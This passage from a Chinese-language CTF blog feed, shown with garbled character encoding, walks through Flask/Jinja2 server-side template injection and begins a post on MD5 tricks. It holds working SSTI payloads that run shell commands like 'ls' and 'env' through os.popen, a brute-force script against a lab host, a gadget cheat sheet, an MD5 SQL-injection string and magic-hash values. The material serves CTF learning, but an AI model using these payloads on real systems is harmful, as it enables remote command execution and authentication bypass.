title="1.å¯»æ‰¾å†…ç½®ç±»æ‰€å¯¹åº”çš„ç±»"></a>1.å¯»æ‰¾å†…ç½®ç±»æ‰€å¯¹åº”çš„ç±»</h3><p>ä½¿ç”¨<strong>class</strong>æ¥è·å–å†…ç½®ç±»æ‰€å¯¹åº”çš„ç±»ï¼›å¯ä»¥ä½¿ç”¨strã€dictã€tupleã€listè¿›è¡Œè·å–ä¹Ÿå°±æ˜¯å¯ä»¥å°†å•å¼•å·æ”¹ä¸º<code>&quot;&quot;</code>,<code>[]</code>,<code>&#123;&#125;</code><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__&#125;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2-æ‰¾åˆ°object"><a href="#2-æ‰¾åˆ°object" class="headerlink" title="2.æ‰¾åˆ°object"></a>2.æ‰¾åˆ°object</h3><p>åˆ©ç”¨é­”æœ¯æ–¹æ³•<code>__base__</code>ï¼Œ<code>__mro__</code>æ¥å¯»æ‰¾<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__&#125;&#125;<span class="comment">#baseè¦å¤šä¸ªç›´åˆ°æ‰¾åˆ°objectä¸ºæ­¢</span></span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[xxx]&#125;&#125;<span class="comment">#é€‰æ‹©æœ€åä¸€ä¸ªçˆ¶ç±»çš„ç´¢å¼•</span></span><br></pre></td></tr></table></figure></p><h3 id="3-æŸ¥æ‰¾objectä¸‹çš„æ‰€æœ‰å­ç±»"><a href="#3-æŸ¥æ‰¾objectä¸‹çš„æ‰€æœ‰å­ç±»" class="headerlink" title="3.æŸ¥æ‰¾objectä¸‹çš„æ‰€æœ‰å­ç±»"></a>3.æŸ¥æ‰¾objectä¸‹çš„æ‰€æœ‰å­ç±»</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[xxx].__subclasses()__&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="4-é€‰æ‹©å¯ä»¥getshellçš„ç±»"><a href="#4-é€‰æ‹©å¯ä»¥getshellçš„ç±»" class="headerlink" title="4.é€‰æ‹©å¯ä»¥getshellçš„ç±»"></a>4.é€‰æ‹©å¯ä»¥getshellçš„ç±»</h3><p>å¸¸ç”¨çš„ä¸ºos._wrap_close<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[xxx].__subclasses__()[xxx]&#125;&#125;</span><br></pre></td></tr></table></figure></p><h3 id="5-è°ƒç”¨getshellæŒ‡ä»¤"><a href="#5-è°ƒç”¨getshellæŒ‡ä»¤" class="headerlink" title="5.è°ƒç”¨getshellæŒ‡ä»¤"></a>5.è°ƒç”¨getshellæŒ‡ä»¤</h3><p>æˆ‘ä»¬å°†ç±»è¿›è¡Œåˆå§‹åŒ–åœ¨æŸ¥çœ‹å™¨ä¸‹é¢çš„æ‰€æœ‰æ–¹æ³•<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure></p><h4 id="åœ¨æ–¹æ³•é‡Œé¢ç›´æ¥å¯»æ‰¾popenï¼Œevalç­‰"><a href="#åœ¨æ–¹æ³•é‡Œé¢ç›´æ¥å¯»æ‰¾popenï¼Œevalç­‰" class="headerlink" title="åœ¨æ–¹æ³•é‡Œé¢ç›´æ¥å¯»æ‰¾popenï¼Œevalç­‰"></a>åœ¨æ–¹æ³•é‡Œé¢ç›´æ¥å¯»æ‰¾popenï¼Œevalç­‰</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨æ¨¡å—builtinsæ¥è¿›è¡Œ"><a href="#ä½¿ç”¨æ¨¡å—builtinsæ¥è¿›è¡Œ" class="headerlink" title="ä½¿ç”¨æ¨¡å—builtinsæ¥è¿›è¡Œ"></a>ä½¿ç”¨æ¨¡å—<strong>builtins</strong>æ¥è¿›è¡Œ</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[xxx].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="buuctf-flask-ssti"><a href="#buuctf-flask-ssti" class="headerlink" title="buuctf [flask]ssti"></a>buuctf [flask]ssti</h2><p>æˆ‘ä»¬æ‰“å¼€é¶æœºï¼Œåœ¨urlä¸Šè¾“å…¥?name=49å›æ˜¾49å‘ç°sstiæ¼æ´<br>æˆ‘ä»¬è¾“å…¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><br>æ‰“å¼€æºç ctrl+fæœç´¢os._wrap_closeå‘ç°å­˜åœ¨è¿™ä¸ªç±»æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹è„šæœ¬æ¥å¯»æ‰¾è¯¥ç±»çš„ä½ç½®<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    url=<span class="string">&quot;http://node5.buuoj.cn:29862/?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    r=requests.get(url=url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os._wrap_close&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><br>è¾“å‡º117<br>æˆ‘ä»¬è¾“å…¥ä»¥ä¸‹å†…å®¹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;__class__.__base__.__subclasses__()[117].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><br>åŒæ ·æœç´¢popenæ–¹æ³•æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ï¼Œ<br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/8.png" class="" title="Alt text"><br>å…¶flagæ˜¯å­˜åœ¨äºç¯å¢ƒå˜é‡é‡Œï¼Œä»¥ä¸‹payloadã€‚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.buuoj.cn:29862/?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;env&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2024/01/19/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/9.png" class="" title="Alt text"><br>é™¤äº†ä¸Šé¢çš„è¿˜æœ‰ä»¥ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__.__builtins__[&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="å¸¸ç”¨æ¨¡æ¿"><a href="#å¸¸ç”¨æ¨¡æ¿" class="headerlink" title="å¸¸ç”¨æ¨¡æ¿"></a>å¸¸ç”¨æ¨¡æ¿</h2><h1 id="ç±»çš„çŸ¥è¯†æ€»ç»“ï¼ˆè½¬è½½"><a href="#ç±»çš„çŸ¥è¯†æ€»ç»“ï¼ˆè½¬è½½" class="headerlink" title="ç±»çš„çŸ¥è¯†æ€»ç»“ï¼ˆè½¬è½½)"></a>ç±»çš„çŸ¥è¯†æ€»ç»“ï¼ˆè½¬è½½)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__            ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚</span><br><span class="line">__base__             ç±»å‹å¯¹è±¡çš„ç›´æ¥åŸºç±»</span><br><span class="line">__bases__            ç±»å‹å¯¹è±¡çš„å…¨éƒ¨åŸºç±»ï¼Œä»¥å…ƒç»„å½¢å¼ï¼Œç±»å‹çš„å®ä¾‹é€šå¸¸æ²¡æœ‰å±æ€§ __bases__</span><br><span class="line">__mro__              æ­¤å±æ€§æ˜¯ç”±ç±»ç»„æˆçš„å…ƒç»„ï¼Œåœ¨æ–¹æ³•è§£ææœŸé—´ä¼šåŸºäºå®ƒæ¥æŸ¥æ‰¾åŸºç±»ã€‚</span><br><span class="line">__subclasses__()     è¿”å›è¿™ä¸ªç±»çš„å­ç±»é›†åˆï¼ŒEach class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function</span><br><span class="line">__globals__          ä½¿ç”¨æ–¹å¼æ˜¯ å‡½æ•°å.__globals__è·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡ã€‚</span><br><span class="line">__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ</span><br><span class="line">__getattribute__()   å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚</span><br><span class="line">__getitem__()        è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[&#x27;b&#x27;]ï¼Œå°±æ˜¯a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚</span><br><span class="line">__import__           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆå°±æ˜¯æ‰“å°å‡ºæ¥ã€‚</span><br><span class="line">url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#x27;__builtins__&#x27;]å«æœ‰current_appã€‚</span><br><span class="line">get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#x27;__builtins__&#x27;]å«æœ‰current_appã€‚</span><br><span class="line">lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚</span><br><span class="line"></span><br><span class="line">request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1    getä¼ å‚</span><br><span class="line">request.values.x1  æ‰€æœ‰å‚æ•°</span><br><span class="line">request.cookies      cookieså‚æ•°</span><br><span class="line">request.headers      è¯·æ±‚å¤´å‚æ•°</span><br><span class="line">request.form.x1    postä¼ å‚(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)</span><br><span class="line">request.data   postä¼ å‚(Content-Type:a/b)</span><br><span class="line">request.json postä¼ json  (Content-Type: application/json)</span><br><span class="line">config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g  </span><br></pre></td></tr></table></figure><h1 id="å¸¸è§è¿‡æ»¤å™¨ï¼ˆè½¬è½½ï¼‰"><a href="#å¸¸è§è¿‡æ»¤å™¨ï¼ˆè½¬è½½ï¼‰" class="headerlink" title="å¸¸è§è¿‡æ»¤å™¨ï¼ˆè½¬è½½ï¼‰"></a>å¸¸è§è¿‡æ»¤å™¨ï¼ˆè½¬è½½ï¼‰</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">å¸¸ç”¨çš„è¿‡æ»¤å™¨</span><br><span class="line"></span><br><span class="line">int()ï¼šå°†å€¼è½¬æ¢ä¸ºintç±»å‹ï¼›</span><br><span class="line"></span><br><span class="line">float()ï¼šå°†å€¼è½¬æ¢ä¸ºfloatç±»å‹ï¼›</span><br><span class="line"></span><br><span class="line">lower()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›</span><br><span class="line"></span><br><span class="line">upper()ï¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™ï¼›</span><br><span class="line"></span><br><span class="line">title()ï¼šæŠŠå€¼ä¸­çš„æ¯ä¸ªå•è¯çš„é¦–å­—æ¯éƒ½è½¬æˆå¤§å†™ï¼›</span><br><span class="line"></span><br><span class="line">capitalize()ï¼šæŠŠå˜é‡å€¼çš„é¦–å­—æ¯è½¬æˆå¤§å†™ï¼Œå…¶ä½™å­—æ¯è½¬å°å†™ï¼›</span><br><span class="line"></span><br><span class="line">trim()ï¼šæˆªå–å­—ç¬¦ä¸²å‰é¢å’Œåé¢çš„ç©ºç™½å­—ç¬¦ï¼›</span><br><span class="line"></span><br><span class="line">wordcount()ï¼šè®¡ç®—ä¸€ä¸ªé•¿å­—ç¬¦ä¸²ä¸­å•è¯çš„ä¸ªæ•°ï¼›</span><br><span class="line"></span><br><span class="line">reverse()ï¼šå­—ç¬¦ä¸²åè½¬ï¼›</span><br><span class="line"></span><br><span class="line">replace(value,old,new)ï¼š æ›¿æ¢å°†oldæ›¿æ¢ä¸ºnewçš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">truncate(value,length=255,killwords=False)ï¼šæˆªå–lengthé•¿åº¦çš„å­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">striptags()ï¼šåˆ é™¤å­—ç¬¦ä¸²ä¸­æ‰€æœ‰çš„HTMLæ ‡ç­¾ï¼Œå¦‚æœå‡ºç°å¤šä¸ªç©ºæ ¼ï¼Œå°†æ›¿æ¢æˆä¸€ä¸ªç©ºæ ¼ï¼›</span><br><span class="line"></span><br><span class="line">escape()æˆ–eï¼šè½¬ä¹‰å­—ç¬¦ï¼Œä¼šå°†&lt;ã€&gt;ç­‰ç¬¦å·è½¬ä¹‰æˆHTMLä¸­çš„ç¬¦å·ã€‚æ˜¾ä¾‹ï¼šcontent|escapeæˆ–content|eã€‚</span><br><span class="line"></span><br><span class="line">safe()ï¼š ç¦ç”¨HTMLè½¬ä¹‰ï¼Œå¦‚æœå¼€å¯äº†å…¨å±€è½¬ä¹‰ï¼Œé‚£ä¹ˆsafeè¿‡æ»¤å™¨ä¼šå°†å˜é‡å…³æ‰è½¬ä¹‰ã€‚ç¤ºä¾‹ï¼š &#123;&#123;&#x27;&lt;em&gt;hello&lt;/em&gt;&#x27;|safe&#125;&#125;ï¼›</span><br><span class="line"></span><br><span class="line">list()ï¼šå°†å˜é‡åˆ—æˆåˆ—è¡¨ï¼›</span><br><span class="line"></span><br><span class="line">string()ï¼šå°†å˜é‡è½¬æ¢æˆå­—ç¬¦ä¸²ï¼›</span><br><span class="line"></span><br><span class="line">join()ï¼šå°†ä¸€ä¸ªåºåˆ—ä¸­çš„å‚æ•°å€¼æ‹¼æ¥æˆå­—ç¬¦ä¸²ã€‚ç¤ºä¾‹çœ‹ä¸Šé¢payloadï¼›</span><br><span class="line"></span><br><span class="line">abs()ï¼šè¿”å›ä¸€ä¸ªæ•°å€¼çš„ç»å¯¹å€¼ï¼›</span><br><span class="line"></span><br><span class="line">first()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼›</span><br><span class="line"></span><br><span class="line">last()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼›</span><br><span class="line"></span><br><span class="line">format(value,arags,*kwargs)ï¼šæ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚æ¯”å¦‚ï¼š&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;å°†è¾“å‡ºï¼šHelloo? - Foo!</span><br><span class="line"></span><br><span class="line">length()ï¼šè¿”å›ä¸€ä¸ªåºåˆ—æˆ–è€…å­—å…¸çš„é•¿åº¦ï¼›</span><br><span class="line"></span><br><span class="line">sum()ï¼šè¿”å›åˆ—è¡¨å†…æ•°å€¼çš„å’Œï¼›</span><br><span class="line"></span><br><span class="line">sort()ï¼šè¿”å›æ’åºåçš„åˆ—è¡¨ï¼›</span><br><span class="line"></span><br><span class="line">default(value,default_value,boolean=false)ï¼šå¦‚æœå½“å‰å˜é‡æ²¡æœ‰å€¼ï¼Œåˆ™ä¼šä½¿ç”¨å‚æ•°ä¸­çš„å€¼æ¥ä»£æ›¿ã€‚ç¤ºä¾‹ï¼šname|default(&#x27;xiaotuo&#x27;)----å¦‚æœnameä¸å­˜åœ¨ï¼Œåˆ™ä¼šä½¿ç”¨xiaotuoæ¥æ›¿ä»£ã€‚boolean=Falseé»˜è®¤æ˜¯åœ¨åªæœ‰è¿™ä¸ªå˜é‡ä¸ºundefinedçš„æ—¶å€™æ‰ä¼šä½¿ç”¨defaultä¸­çš„å€¼ï¼Œå¦‚æœæƒ³ä½¿ç”¨pythonçš„å½¢å¼åˆ¤æ–­æ˜¯å¦ä¸ºfalseï¼Œåˆ™å¯ä»¥ä¼ é€’boolean=trueã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨oræ¥æ›¿æ¢ã€‚</span><br><span class="line"></span><br><span class="line">length()è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œåˆ«åæ˜¯count</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> ssti </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>md5ç¢°æ’</title>
      <link href="/2024/01/14/md5%E7%A2%B0%E6%92%9E/"/>
      <url>/2024/01/14/md5%E7%A2%B0%E6%92%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="md5-å‡½æ•°ä»‹ç»"><a href="#md5-å‡½æ•°ä»‹ç»" class="headerlink" title="md5()å‡½æ•°ä»‹ç»"></a>md5()å‡½æ•°ä»‹ç»</h1><p>md5(str,raw)<br>strä¸ºè¦ç¼–ç çš„å­—ç¬¦ä¸²<br>rawä¸ºç¼–ç æ¨¡å¼é»˜è®¤ä¸ºfalseå³32ä¸º16è¿›åˆ¶å­—ç¬¦ã€‚å¦‚æœè¾“å…¥ä¸ºtrueåˆ™ä¸ºåŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼</p><h1 id="md5-sqlæ³¨å…¥"><a href="#md5-sqlæ³¨å…¥" class="headerlink" title="md5()sqlæ³¨å…¥"></a>md5()sqlæ³¨å…¥</h1><p>æˆ‘å†™è¿‡çš„ä¸€é“é¢˜ç›®ä¸­æœ‰å¦‚ä¸‹sqlæŸ¥è¯¢è¯­å¥<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;$user&#x27; and password=&#x27;.&quot;md($password,true)&quot;.&#x27;</span><br></pre></td></tr></table></figure><br>è¿™æ—¶å€™æˆ‘ä»¬ç»™passwordè¾“å…¥<br>ffifdyop<br>è¯¥å­—ç¬¦å°±ä¼šè¢«ç¼–ç ä¸º<br><code>276f722736c95d99e921722cf9ed621c</code>è½¬ä¸ºå­—ç¬¦ä¸²ä¸º<code>&#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</code><br>è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å‘ç°orå‰åéƒ½æœ‰â€™è¿™å›å°†ä¹‹å‰å’Œä¹‹åçš„â€™é—­åˆorâ€™6diaidâ€™åªè¦å¼€å¤´ä¸ºæ•°å­—é‚£ä¹ˆå°±ç›¸å½“äºorä¸Šä¸€ä¸ªæ•°å­—å³orä¸Šä¸€ä¸ªçœŸé‚£ä¹ˆå°±ä¼šå¦‚æœè¿™ä¸ªæŸ¥è¯¢</p><h1 id="md5å¼±æ¯”è¾ƒç»•è¿‡"><a href="#md5å¼±æ¯”è¾ƒç»•è¿‡" class="headerlink" title="md5å¼±æ¯”è¾ƒç»•è¿‡"></a>md5å¼±æ¯”è¾ƒç»•è¿‡</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br></pre></td></tr></table></figure><p>å› ä¸ºphpçš„å¼±æ¯”è¾ƒæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç¼–ç åä¸º0eå¼€å¤´çš„è¿›è¡Œç»•è¿‡</p><h1 id="md5å¼ºæ¯”è¾ƒç»•è¿‡"><a href="#md5å¼ºæ¯”è¾ƒç»•è¿‡" class="headerlink" title="md5å¼ºæ¯”è¾ƒç»•è¿‡"></a>md5å¼ºæ¯”è¾ƒç»•è¿‡</h1><p>ç”±äºmd5æ˜¯32ä½çš„å³å…¶æ˜¯æœ‰ç©·çš„ï¼Œé‚£ä¹ˆå°±å›å­˜åœ¨åŸå­—ç¬¦ä¸²ä¸åŒä½†æ˜¯md5å®Œå…¨ç›¸åŒçš„æƒ…å†µå¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$s1 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f